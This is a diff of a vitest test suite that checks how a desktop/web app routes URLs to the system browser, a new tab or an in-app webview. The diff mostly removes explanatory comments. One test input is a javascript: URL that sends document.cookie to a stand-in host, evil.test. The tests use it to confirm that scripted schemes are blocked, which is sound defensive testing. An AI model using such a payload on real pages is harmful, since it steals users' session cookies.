@@ -1,9 +1,6 @@
 import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
 import { confirmState, panelOverlay, preferences, webviewInitialUrl, toasts } from '../store';
 
-// Spy on the panel side effects — real implementations dirty localStorage,
-// a module-level nav stack, and touch viewport/DOM state. artifacts.ts imports
-// only pushNavState from './navigation' (it defines its own normalizeUrl).
 const pushNavState = vi.fn();
 vi.mock('./navigation', () => ({ pushNavState }));
 const revealContentPane = vi.fn();
@@ -13,13 +10,9 @@ const platformMocks = vi.hoisted(() => ({ isTauri: false, isIOSPwa: false }));
 vi.mock('../../utils/platform', () => ({
   isTauri: () => platformMocks.isTauri,
   isIOS: () => false,
-  // Read by openExternalUrl (the non-Tauri branch of openUrl).
   isIOSPwa: () => platformMocks.isIOSPwa,
 }));
 
-// openExternal is the OS opener (system browser). setTitlebarColor is unused
-// here but the real preferences module (loaded via artifacts → inAppBrowserAvailable)
-// imports it from this module, so the mock must provide it.
 const openExternal = vi.hoisted(() => vi.fn(() => Promise.resolve()));
 vi.mock('../../utils/tauri', () => ({
   openExternal,
@@ -27,18 +20,11 @@ vi.mock('../../utils/tauri', () => ({
   windowReadyToShow: () => {},
 }));
 
-// The engine-log breadcrumb channel would fire a real fetch from the blocked
-// case below; stub it so this suite stays offline.
 const postClientLog = vi.hoisted(() => vi.fn());
 vi.mock('../../utils/clientLog', () => ({ postClientLog }));
 
-// Imports must come after vi.mock so the mocked deps are wired in.
 const { openUrl, openUrlOutsideApp, openLocalFileOnConfirm } = await import('./artifacts');
 
-// jsdom doesn't implement window.open, so stub it as a global rather than
-// spying on a non-existent property. It returns a window handle by default:
-// openExternalUrl reads the return value to tell a real tab from one the
-// popup blocker refused, so a bare vi.fn() would read as "blocked".
 const windowOpen = vi.hoisted(() => vi.fn());
 function fakeWindow(): { closed: boolean; opener: unknown } {
   return { closed: false, opener: {} };
@@ -83,11 +69,6 @@ describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing'
   });
 
   it('non-Tauri, popup blocked: the whole chain surfaces it instead of going silent', () => {
-    // The reported bug end to end. A `navigate_ui` with target `url` arrives
-    // over SSE, so handleNavigationRequest → openUrl → openExternalUrl runs in a
-    // network event handler with no transient user activation and Chrome refuses
-    // the popup. Every layer used to drop that on the floor while the engine had
-    // already told the agent the device was asked to open the page.
     platformMocks.isTauri = false;
     windowOpen.mockReturnValue(null);
 
@@ -125,7 +106,7 @@ describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing'
 
   it('Tauri + toggle off (default): opens the system browser, never the in-app panel', () => {
     platformMocks.isTauri = true;
-    preferences.value = { status: 'loaded', data: {} }; // experimental_in_app_browser unset → off
+    preferences.value = { status: 'loaded', data: {} };
 
     openUrl(TARGET_URL);
 
@@ -150,10 +131,6 @@ describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing'
     expect(window.location.href).toBe(APP_URL);
   });
 
-  // The reported bug: an OAuth authorization page opened inside the in-app
-  // browser and rendered nothing. Providers refuse a sign-in flow in an
-  // embedded webview, so `openOAuthAuthorizationUrl` calls this instead of
-  // `openUrl` and the toggle gets no vote.
   it('openUrlOutsideApp, Tauri + toggle ON: the OS opener, and no panel', () => {
     platformMocks.isTauri = true;
     preferences.value = { status: 'loaded', data: { experimental_in_app_browser: 'true' } };
@@ -167,8 +144,6 @@ describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing'
     expect(window.open).not.toHaveBeenCalled();
   });
 
-  // Web and PWA are unchanged: still a tab, still `openExternalUrl`'s toast on
-  // a refused popup.
   it('openUrlOutsideApp, non-Tauri: a new tab, never the OS opener', () => {
     platformMocks.isTauri = false;
 
@@ -188,10 +163,6 @@ describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing'
     expect(toasts.value[0].message).toContain('(requested by thread "Weekly report")');
   });
 
-  // A scripted url must die at the opener, not at one ingress. The deep-link
-  // parser screened it; an agent `navigate_ui` over SSE, a notification-toast
-  // tap and a notification inbox-row tap all reached here unscreened. Each of
-  // the three destinations below is a separate sink, so each gets its own case.
   describe('a scripted scheme reaches none of the three sinks', () => {
     const SCRIPTED = 'javascript:fetch("https://evil.test/"+document.cookie)';
 
@@ -249,8 +220,6 @@ describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing'
     });
   });
 
-  // An app frame or an agent can raise a navigate with no click behind it. On
-  // the desktop app, the OS opener launches whatever a `file:` URL names.
   describe('asks before handing a local file to the OS opener', () => {
     const LOCAL = 'file:///Applications/Terminal.app';
 
@@ -291,8 +260,6 @@ describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing'
       expect(openExternal).not.toHaveBeenCalled();
     });
 
-    // The reported bug: on the iOS PWA a bare disk path went to `window.open`,
-    // which resolved it against the page origin and landed on the gateway.
     it.each([
       '/Users/me/Downloads/Lucidos.dmg',
       'file:///Users/me/Downloads/Lucidos.dmg',
@@ -310,8 +277,6 @@ describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing'
       expect(toasts.value[0].message).toContain('(requested by thread "Release")');
     });
 
-    // `extractLocalFileTarget` also claims a protocol-relative URL
-    // (docs/code-review-priors.md). It is a web page, not a disk path.
     it('a browser still opens a protocol-relative url in a tab', () => {
       platformMocks.isTauri = false;
 
@@ -324,8 +289,6 @@ describe('openUrl / openUrlOutsideApp: system browser vs in-app webview routing'
       expect(toasts.value).toEqual([]);
     });
 
-    // The in-app browser's page text goes to the model with the next message,
-    // so a local file must never render there. It takes the confirmed OS path.
     it('Tauri + toggle ON: a local file asks for the OS opener, never the panel', async () => {
       platformMocks.isTauri = true;
       preferences.value = { status: 'loaded', data: { experimental_in_app_browser: 'true' } };
